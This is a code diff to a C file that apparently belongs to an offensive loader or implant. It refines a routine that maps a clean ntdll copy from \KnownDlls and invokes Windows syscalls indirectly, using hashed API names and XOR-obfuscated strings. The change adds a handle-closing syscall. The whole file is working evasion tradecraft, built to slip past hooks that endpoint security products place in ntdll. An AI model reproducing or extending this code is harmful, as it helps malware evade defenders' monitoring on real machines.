@@ -228,7 +228,7 @@ BOOL FetchNtSyscall(IN DWORD dwSyscallHash, OUT PNT_SYSCALL pNtSyscall) {
 // PEB-ntdll exports as the SSN source (graceful
 // fallback — same behavior as before this patch).
 // -----------------------------------------------
-static BOOL SwitchToCleanNtdll(IN PNT_SYSCALL pNtOpen, IN PNT_SYSCALL pNtMap) {
+static BOOL SwitchToCleanNtdll(IN PNT_SYSCALL pNtOpen, IN PNT_SYSCALL pNtMap, IN PNT_SYSCALL pNtClose) {
 
     // Decode "\KnownDlls\ntdll.dll" and widen to WCHAR
     BYTE xPath[] = XSTR_KNOWNDLLS_NTDLL;
@@ -284,6 +284,16 @@ static BOOL SwitchToCleanNtdll(IN PNT_SYSCALL pNtOpen, IN PNT_SYSCALL pNtMap) {
         (ULONG_PTR)0x02,                    // PAGE_READONLY (SEC_IMAGE ignores)
         0, 0
     );
+    // Close the section handle — the mapping survives and we don't need
+    // the handle any further. Skipped silently if NtClose didn't bootstrap.
+    if (pNtClose && pNtClose->dwSyscallHash) {
+        SET_SYSCALL(*pNtClose);
+        RunSyscall(
+            (ULONG_PTR)hSection,
+            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+        );
+    }
+
     if (!NT_SUCCESS(status) || !pClean)
         return FALSE;
 
@@ -332,15 +342,20 @@ BOOL InitializeNtSyscalls(OUT PNTAPI_FUNC pNtApis) {
     if (!CollectSyscallGadgets())
         return FALSE;
 
-    // Bootstrap: extract NtOpenSection + NtMapViewOfSection from PEB-ntdll
-    // so we can map a clean ntdll copy. If the PEB stubs are hooked, the
-    // neighbor-stub fallback in ResolveSyscallStub recovers the real SSN.
-    NT_SYSCALL ntOpen = { 0 };
-    NT_SYSCALL ntMap  = { 0 };
+    // Bootstrap: extract NtOpenSection, NtMapViewOfSection, NtClose from
+    // PEB-ntdll so we can map a clean ntdll copy and release its handle.
+    // If the PEB stubs are hooked, the neighbor-stub fallback in
+    // ResolveSyscallStub recovers the real SSN.
+    NT_SYSCALL ntOpen  = { 0 };
+    NT_SYSCALL ntMap   = { 0 };
+    NT_SYSCALL ntClose = { 0 };
     if (FetchNtSyscall(NtOpenSection_JOAAT, &ntOpen) &&
         FetchNtSyscall(NtMapViewOfSection_JOAAT, &ntMap)) {
-        // Best-effort: on failure we silently keep the PEB-ntdll source.
-        SwitchToCleanNtdll(&ntOpen, &ntMap);
+        // NtClose is best-effort; if bootstrap fails we leak one handle.
+        FetchNtSyscall(NtClose_JOAAT, &ntClose);
+        // Overall switch is best-effort: on failure we silently keep
+        // the PEB-ntdll exports as the SSN source.
+        SwitchToCleanNtdll(&ntOpen, &ntMap, &ntClose);
     }
 
     struct {
